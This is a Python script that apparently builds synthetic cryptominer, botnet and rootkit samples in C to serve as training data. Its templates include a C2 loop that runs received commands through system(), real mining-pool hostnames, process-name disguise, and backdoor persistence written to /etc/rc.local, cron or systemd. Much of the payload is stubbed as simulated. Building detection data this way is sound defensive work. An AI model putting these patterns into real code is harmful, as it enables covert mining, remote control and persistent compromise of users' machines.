#!/usr/bin/env python3
"""
Generate realistic C-based malware pattern samples
Compiles to ARM64 binaries for training
"""

import os
import subprocess
import random
from pathlib import Path
from typing import List

# Malware pattern templates
CRYPTOMINER_TEMPLATE = '''
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

// Cryptominer patterns
const char* mining_pools[] = {{
    "pool.minexmr.com",
    "pool.supportxmr.com",
    "xmr-{region}.nanopool.org",
    "mine.c3pool.com"
}};

const char* wallet = "4{wallet_id}";
const int mining_port = {port};

int main() {{
    // Disguise process name
    char fake_name[] = "[kworker/{core}:0]";

    // Network connection to pool
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    struct sockaddr_in server;
    server.sin_family = AF_INET;
    server.sin_port = htons(mining_port);
    inet_pton(AF_INET, "{pool_ip}", &server.sin_addr);

    // Mining loop
    while(1) {{
        connect(sock, (struct sockaddr*)&server, sizeof(server));
        // Hash calculation (simulated)
        sleep({sleep_time});
    }}

    return 0;
}}
'''

BOTNET_TEMPLATE = '''
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <unistd.h>

// C&C server configuration
const char* c2_servers[] = {{
    "{c2_ip1}",
    "{c2_ip2}",
    "{c2_domain}"
}};

const int c2_ports[] = {{ 8080, 8443, 9999, {custom_port} }};

// Bot capabilities
void execute_command(char* cmd) {{
    system(cmd);
}}

void ddos_attack(char* target, int duration) {{
    // DDoS logic (simulated)
    for(int i = 0; i < duration; i++) {{
        int sock = socket(AF_INET, SOCK_DGRAM, 0);
        // Send packets
        close(sock);
    }}
}}

void spread() {{
    // Worm propagation (simulated)
    const char* targets[] = {{
        "/tmp/{filename}",
        "/var/tmp/{filename}",
        "/dev/shm/{filename}"
    }};
}}

int main() {{
    // Hide process
    char proc_name[] = "systemd-{service}";

    // Connect to C2
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    struct sockaddr_in server;
    server.sin_family = AF_INET;
    server.sin_port = htons(c2_ports[0]);

    // Command loop
    while(1) {{
        char cmd[1024];
        recv(sock, cmd, sizeof(cmd), 0);
        execute_command(cmd);
        sleep({beacon_interval});
    }}

    return 0;
}}
'''

ROOTKIT_TEMPLATE = '''
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>

// Rootkit functionality
const char* hide_files[] = {{
    ".{hidden1}",
    ".{hidden2}",
    "{malware_name}"
}};

const char* hide_processes[] = {{
    "{process1}",
    "{process2}"
}};

// LD_PRELOAD hooking
void* hooked_open(const char* pathname, int flags) {{
    // Filter out hidden files
    for(int i = 0; i < sizeof(hide_files)/sizeof(hide_files[0]); i++) {{
        if(strstr(pathname, hide_files[i])) {{
            return NULL;  // Hide from view
        }}
    }}
    // Call original open
    return NULL;
}}

// Persistence mechanism
void install_persistence() {{
    const char* persistence_methods[] = {{
        "/etc/rc.local",
        "/etc/cron.d/{cron_name}",
        "/etc/systemd/system/{service_name}.service"
    }};

    // Write backdoor
    FILE* f = fopen(persistence_methods[{method_idx}], "a");
    fprintf(f, "/tmp/.{backdoor_name} &\\n");
    fclose(f);
}}

int main() {{
    // Install hooks
    setenv("LD_PRELOAD", "/lib/.{lib_name}.so", 1);

    // Install persistence
    install_persistence();

    // Hide in background
    if(fork() == 0) {{
        setsid();
        chdir("/");
        // Rootkit logic
        while(1) {{
            sleep(3600);
        }}
    }}

    return 0;
}}
'''

TEMPLATES = {
    'cryptominer': CRYPTOMINER_TEMPLATE,
    'botnet': BOTNET_TEMPLATE,
    'rootkit': ROOTKIT_TEMPLATE,
}


class CPatternGenerator:
    """Generate C-based malware patterns"""

    def __init__(self, output_dir: str = 'samples/c-patterns'):
        self.output_dir = Path(output_dir)
        self.output_dir.mkdir(parents=True, exist_ok=True)

    def generate_sample(self, template_name: str, sample_id: int) -> bool:
        """Generate and compile a single sample"""

        template = TEMPLATES[template_name]

        # Generate random parameters
        params = {
            'wallet_id': ''.join(random.choices('0123456789ABCDEFabcdef', k=93)),
            'port': random.choice([3333, 4444, 5555, 7777]),
            'core': random.randint(0, 7),
            'pool_ip': f"{random.randint(1, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 255)}",
            'region': random.choice(['us', 'eu', 'asia']),
            'sleep_time': random.randint(1, 10),
            'c2_ip1': f"{random.randint(1, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 255)}",
            'c2_ip2': f"{random.randint(1, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 255)}",
            'c2_domain': f"c2-{random.randint(1000, 9999)}.example.com",
            'custom_port': random.randint(1024, 65535),
            'filename': f".hidden{random.randint(1, 999)}",
            'service': random.choice(['resolved', 'networkd', 'timesyncd', 'logind']),
            'beacon_interval': random.randint(10, 300),
            'hidden1': f"config{random.randint(1, 99)}",
            'hidden2': f"cache{random.randint(1, 99)}",
            'malware_name': f"service{random.randint(1, 99)}",
            'process1': random.choice(['miner', 'cryptonight', 'xmrig']),
            'process2': random.choice(['scanner', 'bot', 'daemon']),
            'cron_name': f"system{random.randint(1, 99)}",
            'service_name': f"network{random.randint(1, 99)}",
            'method_idx': random.randint(0, 2),
            'backdoor_name': f"update{random.randint(1, 999)}",
            'lib_name': f"lib{random.choice(['c', 'dl', 'pthread'])}{random.randint(1, 9)}",
        }

        # Fill template
        code = template.format(**params)

        # Write C source
        c_file = self.output_dir / f"{template_name}_{sample_id:04d}.c"
        with open(c_file, 'w') as f:
            f.write(code)

        # Compile to ARM64 binary
        binary_file = self.output_dir / f"{template_name}_{sample_id:04d}"

        try:
            # Try to compile
            result = subprocess.run(
                ['gcc', '-o', str(binary_file), str(c_file), '-O2', '-w'],
                capture_output=True,
                timeout=30
            )

            if result.returncode == 0:
                # Remove source file to save space
                c_file.unlink()
                return True
            else:
                # If compilation fails, keep as-is (still useful for training)
                return False

        except (subprocess.TimeoutExpired, FileNotFoundError):
            # GCC not available or timeout
            return False

    def generate_all(self, count: int = 500):
        """Generate all C pattern samples"""
        print(f"Generating {count} C-based malware pattern samples...")

        samples_per_type = count // len(TEMPLATES)
        generated = 0

        for template_name in TEMPLATES.keys():
            print(f"\n  Generating {template_name} patterns...")
            for i in range(samples_per_type):
                success = self.generate_sample(template_name, i)
                generated += 1

                if (i + 1) % 50 == 0:
                    print(f"    Generated {i + 1}/{samples_per_type} {template_name} samples...")

        print(f"\n✅ Generated {generated} C-based malware patterns")
        return generated


def main():
    import argparse
    parser = argparse.ArgumentParser(description='Generate C-based malware patterns')
    parser.add_argument('--output', '-o', default='samples/c-patterns',
                       help='Output directory')
    parser.add_argument('--count', '-c', type=int, default=500,
                       help='Number of samples to generate')

    args = parser.parse_args()

    generator = CPatternGenerator(args.output)
    generator.generate_all(args.count)


if __name__ == '__main__':
    main()
